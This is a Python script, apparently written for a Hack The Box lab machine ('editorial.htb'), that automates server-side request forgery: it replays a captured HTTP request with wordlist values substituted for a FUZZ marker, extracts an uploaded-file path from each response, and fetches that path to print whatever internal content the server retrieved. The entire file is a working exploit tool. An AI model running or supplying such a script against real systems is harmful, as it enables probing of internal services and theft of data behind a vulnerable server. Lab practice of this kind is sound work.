import argparse
import requests

# Function to send the request and replace the FUZZ variable in the body with a word from the wordlist
def send_request_with_word(payload, word):
    # Replace the FUZZ placeholder in the request with the current word
    modified_payload = payload.replace("FUZZ", word)

    # Split the request into headers and body
    headers_part, body_part = modified_payload.split("\n\n", 1)
    header_lines = headers_part.splitlines()

    # Extract the method and URL
    request_line = header_lines[0]
    method, url, _ = request_line.split()

    # Extract headers
    headers = {}
    for header in header_lines[1:]:
        key, value = header.split(": ", 1)
        headers[key] = value

    # Construct full URL if not already
    full_url = "http://" + headers["Host"] + url

    # Send the POST request with modified body
    response = requests.post(full_url, headers=headers, data=body_part)

    # Check for anything that comes after "static/uploads/"
    if "static/uploads/" in response.text:
        # Grep the values after "static/uploads/"
        start_index = response.text.find("static/uploads/") + len("static/uploads/")
        grepped_value = response.text[start_index:].split()[0]  # Take the first part
        return grepped_value
    return None

# Function to send curl request for the grepped value
def send_curl_request(base_url, value):
    url = base_url + value
    response = requests.get(url)
    print(f"Requested URL: {url}, Status Code: {response.status_code}")
    if response.status_code == 200:
        # Print the response content in green
        print(f"\033[92mResponse Content: {response.text}\033[0m")  # Green text with reset
    else:
        # If status code is not 200, print in red
        print(f"\033[91mFailed Request, Status Code: {response.status_code}\033[0m")  # Red text with reset

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(
        description="Automated script to send HTTP requests using a request file and wordlist, and perform SSRF exploitation."
    )
    
    # Add arguments
    parser.add_argument(
        "-r", "--request_file", 
        required=True, 
        help="Path to the request file (e.g., ssrf.request)"
    )
    parser.add_argument(
        "-w", "--wordlist_file", 
        required=True, 
        help="Path to the wordlist file (e.g., wordlist.txt)"
    )
    parser.add_argument(
        "-u", "--base_url", 
        required=True, 
        help="Base URL for the second request (e.g., http://editorial.htb/)"
    )
    
    # Parse the arguments
    args = parser.parse_args()

    # Read the request template
    with open(args.request_file, "r") as req_file:
        request_payload = req_file.read()

    # Read the wordlist
    with open(args.wordlist_file, "r") as wl_file:
        wordlist = wl_file.readlines()

    # Process each word in the wordlist
    for word in wordlist:
        word = word.strip()  # Remove any trailing newlines or spaces
        
        # Send the request with the current word
        grepped_value = send_request_with_word(request_payload, word)
        
        # If a value was grepped, send the curl request
        if grepped_value:
            print(f"Found grepped value: {grepped_value}")
            send_curl_request(args.base_url, grepped_value)

if __name__ == "__main__":
    main()
